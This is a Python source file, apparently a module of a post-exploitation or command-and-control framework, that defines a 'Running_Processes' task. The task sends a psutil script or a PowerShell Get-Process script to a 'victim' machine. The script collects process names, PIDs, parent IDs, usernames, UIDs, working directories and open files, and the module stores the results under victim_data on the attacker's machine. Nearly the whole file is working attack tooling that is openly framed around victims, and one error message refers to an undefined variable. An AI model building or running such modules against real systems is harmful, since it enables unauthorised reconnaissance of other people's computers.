import sys
import os
import pdb
import pathlib
import time
import base64
sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../lib'))

from module import Module

class Running_Processes(Module):
	description = """This module provides details about various processes running on the victim.
		In case of python payload csv is provided, in case of powershell txt file is given."""

	@classmethod
	def module_options(cls):
		h = {
			'path' : 'Directory on the attacker machine where the files are downloaded. Default is shared/victim_data/<victim_id>',
		}
		return h

	def __init__(self,name,utility,language,options):

		## We are loading the script in the script variable here
		super(Running_Processes, self).__init__(name,self.description,utility,language,getattr(self,f"script_{language}")(options))    

	## This class is called when victim returns the output for the task of this module. What is to be done with the output is defined here
	def handle_task_output(self,data,options,victim_id,task_id):
		## Comes as a bytes object, so changing to string
		output = data.decode('utf-8')


		## Default Dumping path
		dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../shared/victim_data',victim_id)

		if not os.path.exists(dump_path):
			os.makedirs(dump_path)

		if self.language == 'python':
			filename = f"runningprocesses_{time.strftime('%Y%m%d-%H%M%S')}_{task_id}.csv"
		else:
			filename = f"runningprocesses_{time.strftime('%Y%m%d-%H%M%S')}_{task_id}.txt"

		file_path = os.path.join(dump_path,filename)

		if 'path' in  options:
			if not os.path.exists(options['path']):
				print(f"Provided save path does not exists - {options['path']}. Saving to default directory {ss_path}")
			else:
				file_path = os.path.join(options['path'],filename)

		f = open(file_path,'w+')
		print(output,file=f)

		## In DB or in logs only indicate where the output is stored
		output = file_path
		return output

	def script_python(self,options):
		script = """def execute_command():
		import psutil
		processes = "processName,processID,parentID,username,status,userid,cwd,openfiles\\n"

		for proc in psutil.process_iter():
			process = ""

			# Many of the methods gives errors
			try:
				process += f"{proc.name() if hasattr(proc, 'name') else ''},"
			except:
				process += ","
			
			try:
				process += f"{proc.pid if hasattr(proc, 'pid') else ''},"
			except:
				process += ","

			try:
				process += f"{proc.ppid() if hasattr(proc, 'ppid') else ''},"
			except:
				process += ","

			try:
				process += f"{proc.username() if hasattr(proc, 'username') else ''},"
			except:
				process += ","

			try:
				process += f"{proc.status() if hasattr(proc, 'status') else ''},"
			except:
				process += ","

			try:
				process += f"{str(proc.uids()).replace(',','') if hasattr(proc, 'uids') else ''},"
			except:
				process += ","

			try:
				process += f"{proc.cwd() if hasattr(proc, 'cwd') else ''},"
			except:
				process += ","

			try:
				files = proc.open_files() if hasattr(proc, 'open_files') else ''
				filestr = ''
				if len(files) != 0:
					for item in files:
						filestr += f"{str(item).replace(',',' ')} : "
				process += f"{filestr}\\n"
			except:
				process += ",\\n"

			if process.strip() != '':
				processes += process

		return processes
		"""

		return script


	def script_powershell(self,options):
		script = """$processes=Get-Process
		return $processes"""


		return script


					
				
